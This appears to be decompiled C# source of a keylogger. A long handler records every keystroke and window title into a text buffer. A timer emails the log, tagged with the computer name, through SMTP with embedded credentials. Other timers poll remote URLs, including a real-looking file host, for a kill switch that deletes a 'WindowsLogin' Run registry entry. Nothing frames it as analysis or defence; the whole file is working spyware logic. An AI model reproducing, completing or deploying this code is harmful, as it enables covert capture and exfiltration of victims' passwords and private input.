		//IL_0f4e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0f51: Invalid comparison between Unknown and I4
		//IL_0f78: Unknown result type (might be due to invalid IL or missing references)
		//IL_0f7b: Invalid comparison between Unknown and I4
		//IL_0fa2: Unknown result type (might be due to invalid IL or missing references)
		//IL_0fa5: Invalid comparison between Unknown and I4
		//IL_0fc9: Unknown result type (might be due to invalid IL or missing references)
		//IL_0fcc: Invalid comparison between Unknown and I4
		//IL_0ff0: Unknown result type (might be due to invalid IL or missing references)
		//IL_0ff3: Invalid comparison between Unknown and I4
		//IL_1017: Unknown result type (might be due to invalid IL or missing references)
		//IL_101a: Invalid comparison between Unknown and I4
		if ((int)Key == 65)
		{
			TextBox1.set_Text(TextBox1.get_Text() + "a");
		}
		else if ((int)Key == 66)
		{
			TextBox1.set_Text(TextBox1.get_Text() + "b");
		}
		else if ((int)Key == 67)
		{
			TextBox1.set_Text(TextBox1.get_Text() + "c");
		}
		else if ((int)Key == 68)
		{
			TextBox1.set_Text(TextBox1.get_Text() + "d");
		}
		else if ((int)Key == 69)
		{
			TextBox1.set_Text(TextBox1.get_Text() + "e");
		}
		else if ((int)Key == 70)
		{
			TextBox1.set_Text(TextBox1.get_Text() + "f");
		}
		else if ((int)Key == 71)
		{
			TextBox1.set_Text(TextBox1.get_Text() + "g");
		}
		else if ((int)Key == 72)
		{
			TextBox1.set_Text(TextBox1.get_Text() + "h");
		}
		else if ((int)Key == 73)
		{
			TextBox1.set_Text(TextBox1.get_Text() + "i");
		}
		else if ((int)Key == 74)
		{
			TextBox1.set_Text(TextBox1.get_Text() + "j");
		}
		else if ((int)Key == 75)
		{
			TextBox1.set_Text(TextBox1.get_Text() + "k");
		}
		else if ((int)Key == 76)
		{
			TextBox1.set_Text(TextBox1.get_Text() + "l");
		}
		else if ((int)Key == 77)
		{
			TextBox1.set_Text(TextBox1.get_Text() + "m");
		}
		else if ((int)Key == 78)
		{
			TextBox1.set_Text(TextBox1.get_Text() + "n");
		}
		else if ((int)Key == 79)
		{
			TextBox1.set_Text(TextBox1.get_Text() + "o");
		}
		else if ((int)Key == 80)
		{
			TextBox1.set_Text(TextBox1.get_Text() + "p");
		}
		else if ((int)Key == 81)
		{
			TextBox1.set_Text(TextBox1.get_Text() + "q");
		}
		else if ((int)Key == 82)
		{
			TextBox1.set_Text(TextBox1.get_Text() + "r");
		}
		else if ((int)Key == 83)
		{
			TextBox1.set_Text(TextBox1.get_Text() + "s");
		}
		else if ((int)Key == 84)
		{
			TextBox1.set_Text(TextBox1.get_Text() + "t");
		}
		else if ((int)Key == 85)
		{
			TextBox1.set_Text(TextBox1.get_Text() + "u");
		}
		else if ((int)Key == 86)
		{
			TextBox1.set_Text(TextBox1.get_Text() + "v");
		}
		else if ((int)Key == 87)
		{
			TextBox1.set_Text(TextBox1.get_Text() + "w");
		}
		else if ((int)Key == 88)
		{
			TextBox1.set_Text(TextBox1.get_Text() + "x");
		}
		else if ((int)Key == 89)
		{
			TextBox1.set_Text(TextBox1.get_Text() + "y");
		}
		else if ((int)Key == 90)
		{
			TextBox1.set_Text(TextBox1.get_Text() + "z");
		}
		else if ((int)Key == 32)
		{
			TextBox1.set_Text(TextBox1.get_Text() + " ");
		}
		else if ((int)Key == 48)
		{
			TextBox1.set_Text(TextBox1.get_Text() + "0");
		}
		else if ((int)Key == 49)
		{
			TextBox1.set_Text(TextBox1.get_Text() + "1");
		}
		else if ((int)Key == 50)
		{
			TextBox1.set_Text(TextBox1.get_Text() + "2");
		}
		else if ((int)Key == 51)
		{
			TextBox1.set_Text(TextBox1.get_Text() + "3");
		}
		else if ((int)Key == 52)
		{
			TextBox1.set_Text(TextBox1.get_Text() + "4");
		}
		else if ((int)Key == 53)
		{
			TextBox1.set_Text(TextBox1.get_Text() + "5");
		}
		else if ((int)Key == 54)
		{
			TextBox1.set_Text(TextBox1.get_Text() + "6");
		}
		else if ((int)Key == 55)
		{
			TextBox1.set_Text(TextBox1.get_Text() + "7");
		}
		else if ((int)Key == 56)
		{
			TextBox1.set_Text(TextBox1.get_Text() + "8");
		}
		else if ((int)Key == 57)
		{
			TextBox1.set_Text(TextBox1.get_Text() + "9");
		}
		else if ((int)Key == 96)
		{
			TextBox1.set_Text(TextBox1.get_Text() + "0");
		}
		else if ((int)Key == 97)
		{
			TextBox1.set_Text(TextBox1.get_Text() + "1");
		}
		else if ((int)Key == 98)
		{
			TextBox1.set_Text(TextBox1.get_Text() + "2");
		}
		else if ((int)Key == 99)
		{
			TextBox1.set_Text(TextBox1.get_Text() + "3");
		}
		else if ((int)Key == 100)
		{
			TextBox1.set_Text(TextBox1.get_Text() + "4");
		}
		else if ((int)Key == 101)
		{
			TextBox1.set_Text(TextBox1.get_Text() + "5");
		}
		else if ((int)Key == 102)
		{
			TextBox1.set_Text(TextBox1.get_Text() + "6");
		}
		else if ((int)Key == 103)
		{
			TextBox1.set_Text(TextBox1.get_Text() + "7");
		}
		else if ((int)Key == 104)
		{
			TextBox1.set_Text(TextBox1.get_Text() + "8");
		}
		else if ((int)Key == 105)
		{
			TextBox1.set_Text(TextBox1.get_Text() + "9");
		}
		else if ((int)Key == 188)
		{
			TextBox1.set_Text(TextBox1.get_Text() + ",");
		}
		else if ((int)Key == 189)
		{
			TextBox1.set_Text(TextBox1.get_Text() + "-");
		}
		else if ((int)Key == 222)
		{
			TextBox1.set_Text(TextBox1.get_Text() + "'");
		}
		else if ((int)Key == 219)
		{
			TextBox1.set_Text(TextBox1.get_Text() + "[");
		}
		else if ((int)Key == 221)
		{
			TextBox1.set_Text(TextBox1.get_Text() + "]");
		}
		else if ((int)Key == 191)
		{
			TextBox1.set_Text(TextBox1.get_Text() + "/");
		}
		else if ((int)Key == 220)
		{
			TextBox1.set_Text(TextBox1.get_Text() + "\\");
		}
		else if ((int)Key == 186)
		{
			TextBox1.set_Text(TextBox1.get_Text() + ";");
		}
		else if ((int)Key == 190)
		{
			TextBox1.set_Text(TextBox1.get_Text() + ".");
		}
		else if ((int)Key == 192)
		{
			TextBox1.set_Text(TextBox1.get_Text() + "`");
		}
		else if ((int)Key == 32)
		{
			TextBox1.set_Text(TextBox1.get_Text() + " ");
		}
		else if ((int)Key == 13)
		{
			TextBox1.set_Text(TextBox1.get_Text() + "\r\n");
		}
		else if ((int)Key == 112)
		{
			TextBox1.set_Text(TextBox1.get_Text() + "[F1]");
		}
		else if ((int)Key == 113)
		{
			TextBox1.set_Text(TextBox1.get_Text() + "[F2]");
		}
		else if ((int)Key == 114)
		{
			TextBox1.set_Text(TextBox1.get_Text() + "[F3]");
		}
		else if ((int)Key == 115)
		{
			TextBox1.set_Text(TextBox1.get_Text() + "[F4]");
		}
		else if ((int)Key == 116)
		{
			TextBox1.set_Text(TextBox1.get_Text() + "[F5]");
		}
		else if ((int)Key == 117)
		{
			TextBox1.set_Text(TextBox1.get_Text() + "[F6]");
		}
		else if ((int)Key == 118)
		{
			TextBox1.set_Text(TextBox1.get_Text() + "[F7]");
		}
		else if ((int)Key == 119)
		{
			TextBox1.set_Text(TextBox1.get_Text() + "[F8]");
		}
		else if ((int)Key == 120)
		{
			TextBox1.set_Text(TextBox1.get_Text() + "[F9]");
		}
		else if ((int)Key == 121)
		{
			TextBox1.set_Text(TextBox1.get_Text() + "[F10]");
		}
		else if ((int)Key == 122)
		{
			TextBox1.set_Text(TextBox1.get_Text() + "[F11]");
		}
		else if ((int)Key == 123)
		{
			TextBox1.set_Text(TextBox1.get_Text() + "[F12]");
		}
		else if ((int)Key == 46)
		{
			if (!TextBox1.get_Text().EndsWith("\r\n") && !TextBox1.get_Text().EndsWith("|") && !TextBox1.get_Text().EndsWith("]"))
			{
				TextBox1.set_Text(TextBox1.get_Text().Substring(0, checked(TextBox1.get_Text().Length - 1)));
			}
		}
		else if ((int)Key == 8)
		{
			if (!TextBox1.get_Text().EndsWith("\r\n") && !TextBox1.get_Text().EndsWith("|") && !TextBox1.get_Text().EndsWith("]"))
			{
				TextBox1.set_Text(TextBox1.get_Text().Substring(0, checked(TextBox1.get_Text().Length - 1)));
			}
		}
		else if ((int)Key == 40)
		{
			TextBox1.set_Text(TextBox1.get_Text() + "");
		}
		else if ((int)Key == 38)
		{
			TextBox1.set_Text(TextBox1.get_Text() + "");
		}
		else if ((int)Key == 37)
		{
			TextBox1.set_Text(TextBox1.get_Text() + "");
		}
		else if ((int)Key == 39)
		{
			TextBox1.set_Text(TextBox1.get_Text() + "");
		}
		else if ((int)Key == 9)
		{
			TextBox1.set_Text(TextBox1.get_Text() + "[TAB]");
		}
		else if ((int)Key == 35)
		{
			TextBox1.set_Text(TextBox1.get_Text() + "[END]");
		}
		else if ((int)Key == 27)
		{
			TextBox1.set_Text(TextBox1.get_Text() + "[ESC]");
		}
		else if ((int)Key == 111)
		{
			TextBox1.set_Text(TextBox1.get_Text() + "/");
		}
		else if ((int)Key == 110)
		{
			TextBox1.set_Text(TextBox1.get_Text() + ".");
		}
		else if ((int)Key == 109)
		{
			TextBox1.set_Text(TextBox1.get_Text() + "-");
		}
		else if ((int)Key == 107)
		{
			TextBox1.set_Text(TextBox1.get_Text() + "+");
		}
		else if ((int)Key == 106)
		{
			TextBox1.set_Text(TextBox1.get_Text() + "*");
		}
		else if ((int)Key == 17)
		{
			TextBox1.set_Text(TextBox1.get_Text() + "[CTRL]");
		}
		else if ((int)Key == 262144)
		{
			TextBox1.set_Text(TextBox1.get_Text() + "[ALT]");
		}
		else if ((int)Key == 33)
		{
			TextBox1.set_Text(TextBox1.get_Text() + "[Page Up]");
		}
		else if ((int)Key == 34)
		{
			TextBox1.set_Text(TextBox1.get_Text() + "[Page Down]");
		}
		else if ((int)Key == 36)
		{
			TextBox1.set_Text(TextBox1.get_Text() + "[Home]");
		}
		else if ((int)Key == 45)
		{
			TextBox1.set_Text(TextBox1.get_Text() + "[Insert]");
		}
		else if ((int)Key == 35)
		{
			TextBox1.set_Text(TextBox1.get_Text() + "[End]");
		}
		else if ((int)Key == 27)
		{
			TextBox1.set_Text(TextBox1.get_Text() + "[Esc]");
		}
		else if ((int)Key == 44)
		{
			TextBox1.set_Text(TextBox1.get_Text() + "[Prt Screen]");
		}
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		MailMessage mailMessage = new MailMessage();
		mailMessage.Subject = ((ServerComputer)Class1.Computer).get_Name() + ":";
		mailMessage.To.Add(string_1);
		mailMessage.From = new MailAddress(string_1);
		mailMessage.Body = TextBox1.get_Text();
		SmtpClient smtpClient = new SmtpClient(Conversions.ToString(object_2));
		smtpClient.Port = 587;
		smtpClient.EnableSsl = true;
		smtpClient.Credentials = new NetworkCredential(string_1, string_2);
		smtpClient.Send(mailMessage);
		((TextBoxBase)TextBox1).Clear();
	}

	private void Timer2_Tick(object sender, EventArgs e)
	{
		if (Operators.CompareString(string_38, method_2(), false) != 0)
		{
			TextBox1.set_Text(TextBox1.get_Text() + "\r\n[" + method_2() + "]:\r\n");
			string_38 = method_2();
		}
	}

	private void Timer3_Tick(object sender, EventArgs e)
	{
		WebClient webClient = new WebClient();
		object[] array = new object[1] { RuntimeHelpers.GetObjectValue(object_10) };
		bool[] array2 = new bool[1] { true };
		object obj = NewLateBinding.LateGet((object)webClient, (Type)null, "DownloadString", array, (string[])null, (Type[])null, array2);
		if (array2[0])
		{
			object_10 = RuntimeHelpers.GetObjectValue(array[0]);
		}
		string text = Conversions.ToString(obj);
		if (text.Contains(Conversions.ToString(object_11)))
		{
			Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.DeleteValue("WindowsLogin");
			Application.Exit();
		}
	}

	private void Timer4_Tick(object sender, EventArgs e)
	{
		try
		{
			WebClient webClient = new WebClient();
			string text = webClient.DownloadString("http://divxdrivers.fileave.com/bejn666.txt");
			if (text.Contains("bejn666"))
			{
				Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.DeleteValue("WindowsLogin");
				Application.Exit();
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}
}
